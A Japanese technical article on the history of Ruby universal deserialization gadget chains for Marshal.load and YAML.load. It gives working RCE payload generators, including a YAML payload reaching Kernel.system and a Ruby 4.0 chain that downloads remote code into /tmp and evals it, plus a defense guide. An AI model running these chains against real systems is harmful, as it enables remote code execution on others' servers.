## Rubyユニバーサルガジェットチェーンの系譜

Rubyの `Marshal.load` や `YAML.load`（内部で使う Psych）は、シリアライズされたデータを読み込むときに、単にデータを復元するだけでなく **クラスを実体化し、復元用のコールバックメソッドを呼ぶ**。この「クラスを実体化してメソッドを呼ぶ」という性質が、攻撃者にとっての足がかりになる。復元処理の途中で呼ばれるメソッドを起点（トリガー）として、標準ライブラリに元から存在するクラスのメソッドを数珠つなぎに呼び出していき、最終的に `Kernel.system` や `eval` のような「任意コード実行の出口（sink：入力が最終的に実行・解釈される危険な代入先）」へ制御を到達させる。この一連の連鎖を **ガジェットチェーン**と呼ぶ。

とりわけ重要なのが **ユニバーサル**（universal）という言葉だ。アプリ独自のクラスや追加 gem に依存せず、**Ruby 標準ライブラリ（rubygems や net/protocol など、Ruby をインストールすれば必ず入っているコード）だけ**でチェーンが完結するものを指す。ユニバーサルなチェーンが存在すると、「信頼できないデータを `Marshal.load`/`YAML.load` に渡している」という一点さえ満たせば、対象アプリのコードを一切知らなくても RCE（リモートコード実行）に至れてしまう。だからこそ、この系譜を理解することは「なぜ untrusted なデータに `Marshal.load` を使ってはいけないのか」を骨の髄まで納得するための最良の教材になる。

この節では、2018年の elttam による最初のユニバーサルチェーンから、2021年の William Bowling（devcraft）／Staaldraad による Ruby 2.x–3.x 対応チェーン、そして2026年の elttam による Ruby 4.0 チェーンまで、**約13年にわたる攻防の系譜**を、なぜ各世代が壊れ、次の世代がどう生き延びたのかという「仕組みレベルの理由」とともに追う。

> ⚠️ **注意（スコープ）**: 本節はすべて防御目的の解説である。掲載するペイロードは各原典で公開済みの技術的事実を、防御側が検知・パッチ判断・設計判断に活用するために引用したものであり、実在サービスや本番環境への無許可検証を推奨するものではない。

### 系譜の全体像（年表）

elttam の Ruby 4.0 記事は、13年に及ぶこの分野の年表を整理している。防御側にとって年表が重要なのは、「自分のRubyバージョンに対して、どの世代のチェーンが刺さるのか（＝どのパッチが効くのか）」を判断する材料になるからだ。

| 年 | 出来事 | 意味 |
| --- | --- | --- |
| 2013 | Hailey Somerville による Rails RCE とバグトラッカー開示 | Ruby デシリアライゼーション RCE の黎明 |
| 2016 | joernchen の Phrack 記事（Rails 攻撃） | 手法の体系化 |
| 2018 | **elttam（Luke Jahnke）**が Ruby 2.x 向け最初のユニバーサルチェーンを公開 | 標準ライブラリだけで RCE できることを実証 |
| 2019 | CVE-2019-5420 ほか、YAML.load 系の複数チェーン | 適用範囲の拡大 |
| 2021 | **William Bowling（devcraft）／Staaldraad** が Ruby 2.x–3.x ユニバーサルチェーンを公開 | 2018年チェーンが 2.7.2 で壊れた後の「復活」 |
| 2022–2024 | 各種の改良・洗練 | ガジェットの入れ替え合戦 |
| 2024年11月 | Luke Jahnke による Ruby 3.4 チェーン | RubyGems の対策コミットを回避 |
| 2026年8月 | **elttam** による Ruby 4.0 チェーン（AI エージェントによる in-the-wild 悪用を受けて公開） | `eval` sink を使う新世代 |

この年表から読み取るべき最重要の教訓は、elttam 自身が結論で述べている次の一文に集約される。

> ガジェットを取り除くことは攻撃コストを上げるが、**能力（capability）そのものを取り除くわけではない**。

つまり「新しいガジェットが見つかるたびに RubyGems にパッチが当たる」といういたちごっこが13年続いており、パッチは根本解決ではない。根本解決は「信頼できないデータに `Marshal.load`/`YAML.load` を使わない」ことだけ、という点を最初に押さえておこう。

### 第1世代（2018）: elttam の最初のユニバーサルチェーン

2018年、elttam の Luke Jahnke は、Ruby 標準ライブラリの `Gem::StubSpecification` などを使い、`Marshal.load` だけで RCE できる最初のユニバーサルチェーンを公開した。これは「アプリ側に特別なクラスがなくても、Ruby さえあれば刺さる」という点で衝撃的だった。

この第1世代チェーンは、後述するように **Ruby 2.7.2 以降で壊れた**（RubyGems 側の実装変更により、`Gem::StubSpecification` を経由するルートが使えなくなった）。Staaldraad は自身の記事でこれを次のように明言している。

> オリジナルの elttam / Luke Jahnke のガジェットは、その後パッチが当たり、**Ruby 2.7.2 以降では動作しなくなった**。

したがって防御側の第一の観点は、「2.7.2 未満の古い Ruby を使い続けているなら、第1世代チェーンの標的である」ということだ。ただし後述の第2世代が 2.x 全域をカバーするため、単にバージョンを上げるだけでは不十分である点に注意。

> 出典: elttam — Ruby 4.0 Universal RCE Deserialization Gadget Chain — https://www.elttam.com/blog/ruby-4-0-universal-rce-deserialization-gadget-chain
> 出典: Staaldraad — Universal RCE with Ruby YAML.load (updated) — https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/

### 第2世代（2021）: devcraft / Staaldraad の Ruby 2.x–3.x チェーン

第1世代が 2.7.2 で壊れた後、William Bowling（devcraft）が **Ruby 2.0 〜 3.0.2 の全域**で動く新しいユニバーサルチェーンを発見した。Staaldraad はほぼ同時期にこれを YAML.load 版として再構成・検証した。この世代の中核は、`Gem::StubSpecification` の代わりに **`net/protocol` 由来の `Net::BufferedIO` のログ機構**と **`Gem::RequestSet#resolve`** を組み合わせた点にある。

#### チェーンの流れ（なぜ動くのか）

devcraft のチェーンは、次の順序でメソッドを連鎖させる。各ステップの「なぜ呼ばれるのか」が重要なので、仕組みごと説明する。

1. **`Gem::Requirement#marshal_load`（トリガー）** — `Marshal.load` は、`marshal_dump`/`marshal_load` を定義したクラスを復元するとき、復元直後に `marshal_load` を自動的に呼ぶ。ここが「入口（entry point）」になる。実装は次の通り。

   ```ruby
   def marshal_load(array)
     @requirements = array[0]
     fix_syck_default_key_in_requirements
   end
   ```

   `@requirements` に攻撃者が仕込んだオブジェクトが代入され、続く `fix_syck_default_key_in_requirements` の内部処理が `@requirements` を走査する。ここで攻撃者制御下のオブジェクトのメソッドが呼ばれ始める。

2. **`Gem::Package::TarReader#each`** — `@requirements` に仕込んだ `TarReader` の走査が始まり、tar エントリを1つずつ読もうとする。

3. **`Net::BufferedIO#read` → ログ出力** — tar の読み取りは内部の I/O オブジェクトを介する。ここに `Net::BufferedIO` を差し込むと、読み取りのたびに「reading 512 bytes...」のようなデバッグログを書き出そうとする。ログ出力は `@debug_output << msg` という形で行われる。**この `<<`（追記）演算子の呼び出し先を攻撃者がすり替えられる**のが鍵だ。

4. **`Net::WriteAdapter#<<`** — `@debug_output` に `Net::WriteAdapter` を仕込んでおくと、`<<` が呼ばれた瞬間に内部で次のように任意メソッドを呼び出す。

   ```ruby
   # Net::WriteAdapter の本質
   @socket.__send__(@method_id, str)
   ```

   `@socket` と `@method_id` は攻撃者が自由に設定できる。つまり「任意オブジェクトの任意メソッドを、ログ文字列 `str` を引数に呼ぶ」という汎用ブリッジになっている。

5. **`Gem::RequestSet#resolve`** — 上の `@socket` に `Gem::RequestSet`、`@method_id` に `:resolve` を仕込む。`Gem::RequestSet` は `@sets` と `@git_set` を完全に制御でき、`resolve()` がこれらを未制御のまま下流に渡す。

6. **`Kernel.system`（出口）** — `@sets` に **もう1つの `Net::WriteAdapter`**（`@socket = Kernel`, `@method_id = :system`）を仕込み、`@git_set` に実行したいコマンド文字列（例 `"id"`）を入れておく。これにより最終的に `Kernel.system("id")` に相当する呼び出しへ到達し、RCE が成立する。

ここで巧妙なのは、Staaldraad と devcraft が指摘する **「二段構えの引数」**だ。ログ経由の第1の `WriteAdapter` に渡る引数（`str`）はログ文字列であり攻撃者が完全には制御できない。しかし `Gem::RequestSet#resolve` をもう一段挟むことで、`@git_set`（＝完全に制御できる第2の引数）を実際のコマンドとして流し込める。この「制御できない引数を捨てて、制御できる引数で実行する」二段構えが、第2世代の設計上の要点である。

#### Marshal 版のジェネレータ（原典）

devcraft が公開した、ペイロードを組み立てる Ruby コードは次の通り。`allocate`（`initialize` を呼ばずに空のインスタンスを作る）と `instance_variable_set`（インスタンス変数を直接ねじ込む）を多用して、正規の初期化を経ずに危険な内部状態を組み立てているのが特徴だ。

```ruby
# 出典コード（devcraft）: Ruby 2.7.2 での動作例
Gem::SpecFetcher
Gem::Installer

module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

# 出口: Kernel.system をラップ
wa1 = Net::WriteAdapter.new(Kernel, :system)

# 第2引数を制御するための RequestSet
rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")   # ← 実行コマンド

# resolve を呼ぶための WriteAdapter
wa2 = Net::WriteAdapter.new(rs, :resolve)

# tar エントリ（eof? などをごまかす）
i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

# ログ出力先を wa2 にすり替えた BufferedIO
n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
Marshal.load(payload)  # => sh -c id 相当が実行される
```

配列の先頭に `Gem::SpecFetcher` と `Gem::Installer` を置いているのは、**それらのクラス定数を `Marshal.load` に解決させることで RubyGems の autoload を発火させ、チェーンで使う下流クラス（`Net::WriteAdapter` など）を確実にロードさせる**ためだ。クラスを名前として1つ登場させるだけで、Ruby がそのクラスを（`require` 相当で）読み込む——この「定数解決による副作用」は後の世代でも繰り返し使われる重要テクニックである。

#### YAML.load 版（Staaldraad）

Staaldraad は同じチェーンを YAML で表現した。`YAML.load`（Psych）は Ruby オブジェクトを表す `!ruby/object:` タグに出会うと、そのクラスを実体化し `init_with`（または `yaml_initialize`）を呼ぶため、Marshal と同じトリガーに到達する。

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id           # ← 実行コマンド
         method_id: :resolve
```

このYAMLは、先ほどのMarshalジェネレータが `instance_variable_set` で組み立てていた **オブジェクトグラフをそのまま宣言的に書き下したもの**だと理解すると分かりやすい。`socket:`/`method_id:` が `Net::WriteAdapter` の内部変数、`git_set: id` が実行コマンドに対応する。`!ruby/module 'Kernel'` は「モジュール `Kernel` そのもの」を値として指定し、`Kernel.system` を呼べるようにしている。

Staaldraad は「Ruby 2.0〜3.0 全域で RCE を確認し、以前のバージョンを狙ったパッチを無効化した」と報告している。

#### 影響バージョンとパッチ

- **影響範囲**: Ruby 2.0 〜 3.0.2（`Marshal.load`/`YAML.load` に untrusted データを渡す場合）
- **修正**: Ruby 3.0.3 以降で、rubygems 側コミット（141c2f4）と ruby 本体コミット（2b17d2f）により、このチェーンの経路が塞がれた。

つまり第2世代チェーンに対しては **Ruby 3.0.3 以降へのアップデートが直接の緩和**になる。ただし、これも「そのチェーンを塞いだ」だけで、後述の第3・第4世代が新バージョンを標的に登場することになる。

> 出典: devcraft (William Bowling) — Universal Deserialisation Gadget for Ruby 2.x-3.x — https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
> 出典: Staaldraad — Universal RCE with Ruby YAML.load (updated) — https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/

### 第3世代（2024）: Luke Jahnke の Ruby 3.4 チェーンと、それが壊された理由

2024年11月、Luke Jahnke は Ruby 3.4 を標的とする新チェーンを公開した。これは `Gem::Version#marshal_load` の緩さや `to_s_wrapper`、`Gem::Source::Git`／`Gem::Resolver::GitSet` に実行ファイル名を保持させる `exec_gadget` などを利用していた。

しかしこのチェーンは Ruby 3.4.0 に取り込まれた **2つの RubyGems コミットによって明示的に潰された**。elttam の記事はこれを具体的に挙げている。防御側にとっては「パッチが特定のガジェットをどう無効化するか」の好例なので、仕組みを押さえておきたい。

- **コミット `62b49465f8`**: `Gem::Version#marshal_load` に **型チェック**を追加。バージョン文字列として不正なもの（"wrong version string" 検証に引っかかるもの）を弾くようにし、`to_s_wrapper` を悪用する経路を封じた。
- **コミット `89ad04db86`**: `Gem::Source::Git` と `Gem::Resolver::GitSet` から **実行ファイル名をインスタンス変数として保持する処理を削除**し、`exec_gadget` を消した。

要するに「攻撃に使われていた具体的なガジェット（緩い型のフィールドや、コマンド名を溜め込むフィールド）を、RubyGems 側でピンポイントに削った」わけだ。これで第3世代チェーンは Ruby 3.4 では動かなくなった。

だが——ここが13年間繰り返されてきたパターンだ——**`Gem::SpecFetcher` と `call_url_and_create_folder` は手つかずのまま残った**。この「消し忘れ」が次の第4世代の入口になる。

> 出典: elttam — Ruby 4.0 Universal RCE Deserialization Gadget Chain — https://www.elttam.com/blog/ruby-4-0-universal-rce-deserialization-gadget-chain

### 第4世代（2026）: elttam の Ruby 4.0 チェーン — `eval` sink への転回

2026年8月、elttam は Ruby 4.0 を標的とする新チェーンを公開した。背景として、AI エージェントによる in-the-wild（実環境での）悪用が観測されたことが挙げられている。この世代は、それまでの `Kernel.system` を出口にする発想から離れ、**ファイルをダウンロードして書き込み → `Gem::Specification.load` 経由で `eval` させる**という、より根深い設計に転回した点が特徴だ。

#### 動作環境（バージョン依存）

- **動作する**: Ruby 3.3 〜 Ruby 4.0.6（公開時点の最新）
- **動作しない**: Ruby 3.3 より前（必要なガジェットが存在しない）

第2・第3世代が古いバージョンを標的にしていたのに対し、第4世代は **むしろ新しい 3.3〜4.0 系を標的にする**。つまり「新しいバージョンにすれば安全」という直感は成り立たない。バージョンによって刺さるチェーンが違うだけで、`Marshal.load` を untrusted データに使う限り、どこかの世代が必ず刺さる。

#### チェーンの流れ（なぜ動くのか）

第4世代のチェーンは、大きく「**ファイルを書き込ませるダウンロードガジェット**」と「**そのファイルを `eval` させる実行ガジェット**」の2つのフェーズからなる。elttam が示す流れは次の通り。

1. **`Gem::SpecFetcher`（autoload トリガー）** — 「このクラスが何か仕事をするからではなく、`Marshal.load` が定数を解決しなければならないから」チェーンで使う下流クラス群が autoload される。第2世代と同じ「定数解決の副作用」テクニックだ。

2. **`Time` オブジェクトの復元 → `time_mload`（C実装）** — 攻撃者は細工した `zone`（タイムゾーン）フィールドを持つ `Time` を復元させる。`Time._load`（内部の C 実装 `time_mload`）は zone 値に対して `to_s` ではなく **`to_str`** を呼ぶ。そしてこの C 実装は `rb_rescue` を使っており、**呼び出し中に発生した例外を握りつぶす**。この「例外を捨てる」性質が後で効いてくる（ダウンロードが失敗してもチェーン全体は継続できる）。

3. **`Gem::URI::Generic#to_str → to_s`（メソッドブリッジ）** — zone に仕込んだ `Gem::URI::Generic` は `to_str` を `to_s` にエイリアスしており、`to_s` は内部で `@port` フィールドに対して `to_s` を呼ぶ。これにより「`Time` が呼んだ `to_str`」を「`@port` に仕込んだ次のガジェットの `to_s` 呼び出し」へと橋渡しできる。

4. **ダウンロードガジェット `call_url_and_create_folder`** — `@port` に、`Gem::RequestSet::Lockfile` + `Gem::RequestSet` + `Gem::Source` + `Gem::Resolver::IndexSpecification` を組み合わせたオブジェクトグラフを仕込む。これが最終的に `call_url_and_create_folder` を呼び、攻撃者サーバから **deflate 圧縮された Ruby コードを HTTPS で取得**し、URL に埋め込んだディレクトリトラバーサル（`/../../../../...tmp/`）を使って、狙った場所（例 `/tmp/quick/Marshal.4.8/name-.gemspec`）へ **ファイルとして書き込む**。

5. **例外の握りつぶし** — ダウンロードガジェットは目的（ファイル書き込み）を果たした後、処理が途中でエラーになる。しかしステップ2で述べた `time_mload` の `rb_rescue` が例外を捨てるため、**チェーン全体は死なずに続行**する。ここが第4世代の巧妙さで、「副作用（ファイル書き込み）だけ起こして、失敗は無視する」設計になっている。

6. **`Gem::StubSpecification#hash`（Hashキーとしての自動呼び出し）** — `Marshal.load` は Hash を復元するとき、キーオブジェクトの `hash` メソッドを自動的に呼ぶ（ハッシュテーブルの再構築に必要だから）。攻撃者は `Gem::StubSpecification` を **Hash のキー**として配置しておく。復元完了時にその `hash()` が呼ばれ、内部で `Gem::Specification.load(@loaded_from)` が呼ばれる。

7. **`Gem::Specification.load → eval`（出口）** — `Gem::Specification.load` は指定ファイルを読み、その中身を `eval` に渡す。実装の核心は次の通り。

   ```ruby
   code = Gem.open_file(file, "r:UTF-8:-", &:read)
   spec = eval code, binding, file
   ```

   `@loaded_from` にステップ4で書き込んだファイルのパスを指定しておけば、**ダウンロードした Ruby コードが `eval` されて実行**される。これが第4世代の最終 sink である。

まとめると、第4世代は「`Kernel.system` に文字列を渡す」のではなく、「**攻撃者コードをファイルに落として `eval` する**」という二段構えを取る。`Time` の C 実装（`to_str` を呼び、例外を捨てる）と、`Hash` 復元時に `hash` が呼ばれる Ruby の言語仕様そのものを利用しているため、elttam は「これを取り除くには言語のセマンティクスを根本的に変える必要がある」と評している。ここが「ガジェットを消しても能力は消えない」という結論の技術的裏付けだ。

#### 前提条件（防御側が着目すべき点）

elttam が挙げる第4世代の成立条件は、そのまま防御・検知の観点になる。

- 対象が **攻撃者サーバへ HTTPS で外向き通信**できること（→ egress 制限が緩和になる）
- 対象が **`/tmp` に書き込み**できること
- 標準ライブラリ以外の gem は不要／アプリ固有コードも不要／事前のファイル状態も不要

つまり「外向き通信を絞る」「一時ディレクトリの書き込みを制限する」といったハードニングは、このチェーンの成立を難しくする補助的な緩和になる。ただし根本緩和にはならない点に注意。

#### ジェネレータ（原典）

elttam が公開したペイロード生成コードは次の通り。各ガジェットが前述のどのステップに対応するかをコメントで補った。

```ruby
Gem::SpecFetcher # 定数解決で autoload を発火（ステップ1）

# ステップ4: ファイルをダウンロードして /tmp に書き込むガジェット
def call_url_and_create_folder(url)
  uri = Gem::URI::HTTP.allocate
  uri.instance_variable_set("@path", "/")
  uri.instance_variable_set("@scheme", "s3")
  uri.instance_variable_set("@host", url + "?")
  uri.instance_variable_set("@port",
    "/../../../../../../../../../../../../../../../tmp/"  # トラバーサルで書込先を制御
  )
  uri.instance_variable_set("@user", "any")
  uri.instance_variable_set("@password", "any")

  source = Gem::Source.allocate
  source.instance_variable_set("@uri", uri)
  source.instance_variable_set("@update_cache", true)

  index_spec = Gem::Resolver::IndexSpecification.allocate
  index_spec.instance_variable_set("@name", "name")
  index_spec.instance_variable_set("@source", source)

  request_set = Gem::RequestSet.allocate
  request_set.instance_variable_set("@sorted_requests", [index_spec])

  lockfile = Gem::RequestSet::Lockfile.new('','','')
  lockfile.instance_variable_set("@set", request_set)
  lockfile.instance_variable_set("@dependencies", [])

  return lockfile
end

# ステップ3: to_str -> to_s のブリッジ（@port の to_s を呼ばせる）
def to_str_calls_to_s(to_s_sink)
  uri = Gem::URI::Generic.allocate
  uri.instance_variable_set("@port", to_s_sink)
  return uri
end

# ステップ7: 書き込んだファイルを eval させるガジェット
def eval_file_gadget(filename)
  stub_specification = Gem::StubSpecification.allocate
  stub_specification.instance_variable_set(:@loaded_from, filename)
  return stub_specification
end

# いったん普通の Object として Time の内部レイアウトを模した placeholder を作る
time_placeholder = Object.new
time_placeholder.instance_variable_set("@offset_placeholder", 0)
time_placeholder.instance_variable_set(
  "@zone_placeholder",
  to_str_calls_to_s(call_url_and_create_folder("example.com/poc-id.rz"))
)

# ステップ6: Hash キーになったとき hash() が呼ばれるようにする
class Gem::StubSpecification
  def hash
    0
  end
end

placeholder_gadget_chain = Marshal.dump(
  [
    Gem::SpecFetcher,
    time_placeholder,
    {eval_file_gadget("/tmp/quick/Marshal.4.8/name-.gemspec") => nil}
  ]
)

# placeholder の Object バイト列を、本物の Time のバイト列へ差し替える
rce_gadget_chain = placeholder_gadget_chain.gsub(
  "o:\vObject\a:\x18@offset_placeholderi\x00:\x16@zone_placeholder",
  "Iu:\x09Time\x0d\x00\x00\x00\x80\x00\x00\x00\x00\x07:\x0boffseti\x05:\x09zone"
).b

puts rce_gadget_chain.inspect
```

このジェネレータで注目すべきは最後の `gsub` だ。`Time` を直接 `Marshal.dump` させるのは難しい（内部表現が特殊なため）ので、**まず普通の `Object` を使って全体のバイト列を組み立て、そのあと `Object` を表すバイト列を `Time` を表すバイト列に文字列置換する**という「バイナリ手術」を行っている。これは Marshal フォーマット（`04 08` から始まるバイナリ形式）の構造を熟知していないとできない高度なテクニックであり、`Marshal.load` を untrusted データに使うことが、いかに攻撃者に強力な自由度を与えるかを物語っている。

出来上がる最終ペイロード（Marshal バイナリ）は次の通り。防御側が WAF やログでこのようなバイト列の断片（`Gem::SpecFetcher`、`Gem::RequestSet::Lockfile`、`Gem::StubSpecification`、`/tmp/quick/Marshal.4.8/` など）を検知の手がかりにできる。

```ruby
"\x04\b[\bc\x15Gem::SpecFetcherIu:\tTime\r\x00\x00\x00\x80\x00\x00\x00\x00\a:\voffseti\x05:\tzoneo:\x16Gem::URI::Generic\x06:\n@porto:\x1EGem::RequestSet::Lockfile\n:\t@seto:\x14Gem::RequestSet\x06:\x15@sorted_requests[\x06o:&Gem::Resolver::IndexSpecification\a:\n@nameI\"\tname\x06:\x06ET:\f@sourceo:\x10Gem::Source\a:\t@urio:\x13Gem::URI::HTTP\v:\n@pathI\"\x06/\x06;\x10T:\f@schemeI\"\as3\x06;\x10T:\n@hostI\"\eexample.com/poc-id.rz?\x06;\x10T;\tI\"7/../../../../../../../../../../../../../../../tmp/\x06;\x10T:\n@userI\"\bany\x06;\x10T:\x0E@passwordI\"\bany\x06;\x10T:\x12@update_cacheT:\x12@dependencies[\x00:\x13@gem_deps_fileI\"\t/pwd\x06;\x10T:\x12@gem_deps_dirI\"\x06/\x06;\x10T:\x0F@platforms[\x00{\x06o:\eGem::StubSpecification\x06:\x11@loaded_fromI\")/tmp/quick/Marshal.4.8/name-.gemspec\x06;\x10T0"
```

> 出典: elttam — Ruby 4.0 Universal RCE Deserialization Gadget Chain — https://www.elttam.com/blog/ruby-4-0-universal-rce-deserialization-gadget-chain

### 世代間の比較と、そこから得る設計原則

| 世代 | 年 | 対象バージョン | トリガー | 中核ガジェット | 最終 sink |
| --- | --- | --- | --- | --- | --- |
| 第1 | 2018 | Ruby 2.x（〜2.7.1） | `Marshal.load` | `Gem::StubSpecification` 系 | コード実行 |
| 第2 | 2021 | Ruby 2.0〜3.0.2 | `Gem::Requirement#marshal_load` | `Net::BufferedIO` ログ + `Gem::RequestSet#resolve` + `Net::WriteAdapter` | `Kernel.system` |
| 第3 | 2024 | Ruby 3.4 | Marshal | `Gem::Version` 型緩さ + `exec_gadget` | コード実行 |
| 第4 | 2026 | Ruby 3.3〜4.0.6 | `Gem::SpecFetcher` autoload + `Time` の `time_mload` | ダウンロード + `Gem::StubSpecification#hash` | `Gem::Specification.load → eval` |

この表を縦に眺めると、防御側にとっての最重要の設計原則が浮かび上がる。

1. **「バージョンを上げれば安全」は誤り。** 各世代は異なるバージョン帯を標的にしており、第4世代はむしろ最新の 3.3〜4.0 を狙う。アップデートは「特定世代のチェーンを塞ぐ」緩和にはなるが、恒久対策ではない。

2. **RubyGems のパッチは「ガジェットの削除」であって「能力の削除」ではない。** 第3世代を潰した2つのコミット（`62b49465f8`／`89ad04db86`）が、`Gem::SpecFetcher` を残したために第4世代を生んだ事実が、それを端的に示す。標準ライブラリは巨大で、`Marshal.load` が任意クラスを実体化しメソッドを呼べる限り、新しいガジェットは見つかり続ける。

3. **根本対策は「信頼できないデータを `Marshal.load`／`YAML.load` に渡さない」ことのみ。** elttam の結論を再掲する。

   > ガジェットを取り除くことは攻撃コストを上げるが、能力そのものを取り除くわけではない。**信頼できないデータには、代わりにデータ専用フォーマットを使え。**

### 防御ガイド（実装上の指針）

以上の系譜を踏まえた、防御目的での具体的な指針をまとめる。

- **`Marshal.load`／`Marshal.restore` に外部由来データを絶対に渡さない。** クッキー・セッション・キャッシュ・キュー・アップロードファイルなど、少しでも攻撃者が触れる経路のデータをマーシャルで復元しない。信頼境界を越えるデータの受け渡しには JSON など **オブジェクトを実体化しないデータ専用フォーマット**を使う。
- **`YAML.load` ではなく `YAML.safe_load` を使う。** 現在の Psych では `YAML.load` は安全側（`safe_load` 相当）に寄せられてきているが、明示的に `safe_load` を使い、必要なクラスだけを `permitted_classes` でホワイトリスト指定する。`!ruby/object:` のような任意クラスタグを許可しない。
- **多層防御としてのハードニング。** 第4世代が「外向き HTTPS」と「`/tmp` への書き込み」を前提とする点を踏まえ、アプリの egress（外向き通信）を必要な宛先だけに絞り、一時ディレクトリの権限・実行可否を制限する。これらは成立を難しくする補助であり、根本対策の代替にはならない。
- **検知の手がかり。** ログや WAF で、Marshal バイナリの先頭 `\x04\x08` に続くクラス名文字列（`Gem::SpecFetcher`、`Gem::RequestSet`、`Net::WriteAdapter`、`Gem::StubSpecification` など）や、YAML の `!ruby/object:Gem::Requirement` / `Net::WriteAdapter` / `!ruby/module 'Kernel'` といったパターンを異常として捉える。ただし攻撃者はエンコードやバイト操作で回避しうるため、検知は補助と位置づける。
- **依存の最新化は「特定世代への緩和」として実施する。** Ruby と RubyGems を最新に保てば、既知の第1〜第3世代チェーンは塞げる。ただし第4世代のように新バージョンを狙うチェーンが存在するため、「最新化＝安全」と誤認しないこと。

最終的に、この13年の系譜が教えるのはただ一つ——**信頼できないバイト列を「Ruby オブジェクトとして復元」させた時点で、標準ライブラリという巨大な武器庫を攻撃者に開放している**、という事実である。復元をやめ、データとして受け取ることだけが、この武器庫の扉を閉じる方法だ。